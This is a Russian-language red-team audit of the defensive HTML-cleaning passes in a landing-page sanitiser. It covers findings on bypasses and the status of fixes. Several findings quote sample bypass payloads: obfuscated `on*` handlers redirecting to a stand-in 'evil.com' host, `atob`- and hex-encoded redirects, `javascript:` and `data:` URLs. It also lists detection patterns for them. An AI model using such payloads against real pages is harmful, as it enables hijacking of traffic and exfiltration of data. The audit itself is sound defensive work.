# Red Team: Тир 2d — защитные проходы

- [`strip-event-attrs.ts`](src/mastra/cleaners/passes/html/strip-event-attrs.ts) (+ `registry/event-attrs.ts`)
- [`inject-csp.ts`](src/mastra/cleaners/passes/html/inject-csp.ts) — нить **T-4**
- [`remove-inline-exfil-pass.ts`](src/mastra/cleaners/passes/html/remove-inline-exfil-pass.ts) — нить **T-3** закрывается здесь

**Сильные стороны:** `strip-event-attrs` сохраняет простые quiz-обработчики (`onclick="next()"`) —
не ломает UX; `inject-csp` идемпотентен и ставит мета рано (после charset); `remove-inline-exfil` —
настоящая AST-хирургия тел скриптов (реальная защита от inline-exfil, в отличие от блок-листа 2A-5).

---

## Находки

### [2D-1] 🔴 Bypass · 🟧 High · `data:`/`javascript:`/`blob:` в `src`/`href` не обрабатывает НИКТО (T-3 ✅ закрыт — дыра подтверждена)

- **Полная картина по конвейеру:**
  - 2a (`classifyResource`) → `keep` для не-`http(s)`/`//` схем ([AL-1](allowlist.md));
  - `strip-event-attrs` → трогает только `on*`-атрибуты, не `src`/`href`;
  - `remove-inline-exfil` → только **тела** inline-`<script>`, не атрибуты элементов;
  - `replace-offer-links` → требует `^https?`/`//`, `javascript:` отбрасывает.
- **Последствие:** `<script src="data:text/javascript,…">`, `<iframe src="data:text/html,…">`,
  `<a href="javascript:location='//evil'">` **переживают весь HTML-конвейер нетронутыми**.
  Единственный бэкстоп — CSP, но он meta + `script-src 'unsafe-inline'` ([POL-1](policy.md)), а
  `'unsafe-inline'` разрешает и `javascript:`-навигацию. То есть бэкстопа фактически нет.
- **Рекомендация:** классификация схемы в `allowlist.ts` ([AL-1](allowlist.md)) для script/iframe/
  media → quarantine; `javascript:` в href → remove. Это единственный фикс, закрывающий весь класс.
- **Уверенность:** подтверждено сквозным чтением всех HTML-проходов (T-3 окончательно резолвлен).

### [2D-2] 🔴 Bypass · 🟨 Medium-High · `on*`-обработчики снимаются только при ЛИТЕРАЛЬНОМ url/keyword (✅ закрыта)

- **Сейчас:** `stripEventAttrs` снимает `on*` только если значение содержит `/https?:\/\//i` **или**
  трекер-ключевое слово ([:21](src/mastra/cleaners/passes/html/strip-event-attrs.ts:21)).
- **Последствие:** обработчик с обфусцированным/динамическим exfil-редиректом проходит:
  - `onclick="location='//evil.com'"` — протокол-относительный, нет `https?://` → **остаётся**;
  - `onclick="location=atob('aHR0cHM6...')"` / hex-escape — нет литерального URL → **остаётся**;
  - `onmouseover="new Image().src='\x2f\x2fevil...'"` → **остаётся**.
  И, ключевое: `on*`-атрибуты **никогда** не проходят AST-анализ (`remove-inline-exfil` смотрит только
  `<script>`-тела). Значит обфусцированный exfil в обработчике не ловит **ни один** проход. А модель
  угроз тут — ровно обфусцированная кража трафика.
- **Рекомендация:** для `on*` с редирект/сетевыми паттернами (`location=`, `open(`, `fetch(`,
  `Image`, `//`-строки, `atob`/`\x`) — снимать/флагать; в идеале гнать значение `on*` через тот же
  AST inline-exfil анализ.
- **Уверенность:** подтверждено чтением кода.

### [2D-3] 🔴 Bypass · 🟨 Medium · реестр `DANGEROUS_EVENT_ATTRS` неполон (особенно mobile)

- **Сейчас:** список из ~30 имён ([event-attrs.ts](src/mastra/cleaners/registry/event-attrs.ts)) —
  мышь/клавиатура/load/focus/form. `EVENT_SET.has(name)` отсекает всё, чего нет в списке.
- **Последствие:** не покрыты `ontouchstart/ontouchend/ontouchmove`, `onpointerdown/up/move`,
  `onwheel`, `oncopy/oncut/onpaste`, `onhashchange/onpopstate`, `onbeforeunload/onpagehide`,
  `onplay/onended/ontoggle` и др. Exfil-обработчик на `ontouchstart`/`onpointerdown` (а лендинги
  арбитража — **мобайл**!) даже не проверяется — survive при любом содержимом.
- **Рекомендация:** дополнить список touch/pointer/wheel/clipboard/history/media событиями; либо
  матчить по префиксу `on` + проверять содержимое для всех `on*`.
- **Уверенность:** подтверждено чтением кода + реестра.

### [2D-4] 🟢 Soundness/🟡 Robustness · 🟩 Low-Med · inject-csp: размещение ок (T-4), но не на SKIP_DOM-файлах

- **T-4 ✅ резолвлен:** CSP ставится после `meta[charset]`, иначе первым в `head`
  ([:20–25](src/mastra/cleaners/passes/html/inject-csp.ts:20)); тест подтверждает. Значит политика
  управляет всем последующим — размещение корректное. Идемпотентность есть.
- **Остаток:** (а) контент **до** `<meta charset>` (редкий анти-паттерн — скрипт перед charset) не
  под CSP; (б) на файлах, которые `pipeline` пропустил по `hasServerTags` ([PIPE-1](pipeline.md)),
  `inject-csp` **не выполняется** → у них нет даже CSP-бэкстопа. Слабость самой политики
  (`unsafe-inline`, meta-only) — это [POL-1](policy.md), не размещение.
- **Рекомендация:** убедиться, что charset идёт первым (или ставить CSP самым первым); закрыть PIPE-1,
  иначе «последний рубеж» отсутствует именно там, где чистка пропущена.
- **Уверенность:** подтверждено чтением кода + тестом.

### [2D-5] 🟢 Граница/Robustness · 🟨 Medium · remove-inline-exfil: непарсимое пропускается, только advanced

- **Сейчас:** `if (!ast) return;` ([:22](src/mastra/cleaners/passes/html/remove-inline-exfil-pass.ts:22))
  — непарсимый inline-`<script>` не трогается; проход добавляется только в `--advanced` (по умолчанию
  включён); сам детект exfil — в `js-advanced/remove-inline-exfil` (Тир 3).
- **Последствие:** скрипт с синтаксисом, который acorn не берёт (или намеренно «хитрый»), обходит
  AST-хирургию → exfil остаётся. В не-advanced режиме inline-exfil вообще не чистится (только
  блок-лист 2A-5). И `$(el).text(code)` при сериализации делит риск [DOM-4](html-dom.md) (`</script>`
  в строке).
- **Рекомендация:** соундность детекта — оценить в Тир 3; здесь: логировать «inline-script не
  распарсился, exfil не проверен» (а не молча пропускать), чтобы попадало в отчёт/карантин.
- **Уверенность:** подтверждено чтением кода; детект-логика — Тир 3.

---

## Пробелы в тестах

Нужны: 2D-1 (`data:`/`javascript:` в script/iframe/a — сейчас проходят), 2D-2 (обфусцированный/
протокол-относительный redirect в `onclick`), 2D-3 (`ontouchstart`/`onpointerdown` exfil), 2D-5
(непарсимый inline-script → должен флагаться). У `inject-csp` базовое покрытие есть.

## Итог

1. **2D-1** — окончательно подтверждает [AL-1](allowlist.md): `data:`/`javascript:` нигде не
   обрабатываются. Единственный фикс — классификация схемы в `allowlist.ts`.
2. **2D-2 + 2D-3** — `on*`-обработчики: и логика (только литеральный url), и реестр (нет touch/pointer)
   дырявы; обфусцированный exfil в обработчике не ловит никто.
3. **2D-4** — закрыть PIPE-1, иначе CSP-бэкстоп отсутствует на серверных файлах.

---

## ✅ Статус фиксов (C1)

- **2D-1 ✅ (на уровне классификатора + src-контексты)** — `classifyResource` теперь возвращает
  `quarantine` для `data:`/`blob:`/`javascript:`/`vbscript:`/`filesystem:` в script/iframe/media/
  stylesheet и `remove` для `javascript:`/`vbscript:` в `anchor`(href). Для **src** это уже работает
  end-to-end (проходы 2a зовут `classifyResource`).
- **2D-6 ✅ (проводка прохода по `<a>`/`<area>`):** новый проход
  [`strip-dangerous-hrefs.ts`](src/mastra/cleaners/passes/html/strip-dangerous-hrefs.ts) зовёт
  `classifyResource(href,'anchor')` для `a[href]`/`area[href]` и **нейтрализует** опасную схему
  (`javascript:`/`vbscript:`/`data:`/`blob:`/`filesystem:`): снимает ТОЛЬКО `href` (видимый текст
  кнопки CTA сохраняется), оригинал кладёт в карантин (восстановимо + видно, какую кнопку привязать к
  офферу). Под политику №1 (чужая навигация по клику = кража → действие, не WARN). Гейт — новый
  `dangerousSchemeOf()` в `allowlist.ts`: трогаем ТОЛЬКО схемы, внешние http(s)-хосты остаются зоной
  offer-detector (иначе ломались бы легитимные внешние ссылки, ср. OFFER-1). Подключён в `pipeline`
  перед `replaceOfferLinks`; стат `dangerousHrefsNeutralized`; регресс-тесты —
  `__tests__/strip-dangerous-hrefs.test.ts` (12) + интеграция в `dom-passes.test.ts`.
- **2D-3 ✅** — `strip-event-attrs` теперь снимает ЛЮБОЙ `on*`-обработчик по префиксу `/^on[a-z]/i`
  (фиксированный список `DANGEROUS_EVENT_ATTRS` был неполон и удалён) — покрыты touch/pointer/wheel/
  clipboard/history/media, а лендинги арбитража мобильные. Гейт по значению (внешний URL/трекер-ключевое
  слово) сохранён, поэтому простые quiz-обработчики (`ontouchstart="nextStep()"`) остаются. Тест:
  `strip-event-attrs.test.ts` (8).
- **2D-2 ✅** — обфусцированный/протокол-относительный exfil в значении `on*` теперь ловится.
  `strip-event-attrs` оборачивает значение обработчика в `function __h(event){…}` (чтобы `return`/`this`/
  `event` были валидны), парсит через `parseJs` и гонит AST через те же `detectExfilCalls` + `detectRedirect`,
  что и inline-`<script>` (DET-1/DET-2 умеют обфускацию и `//host`). Снимается: `location='//evil'`,
  `location=atob('aHR0…')`, `fetch(atob(...))`, `new Image().src='\x2f\x2fevil'`, exfil внутри `return …`.
  Гейт по литералу (внешний URL/трекер-слово) сохранён как первая линия; AST-проверка аддитивна. Same-host
  навигация и обычные обработчики (`onsubmit="return validate()"`) остаются (`isExternalUrl` ≠ свой хост;
  непарсимое → не трогаем, ср. ANA-1). Тесты: `strip-event-attrs.test.ts` (+8 = 16).
- **2D-5** — НЕ трогали (непарсимый inline-script — логировать, не молча пропускать); 🆕.
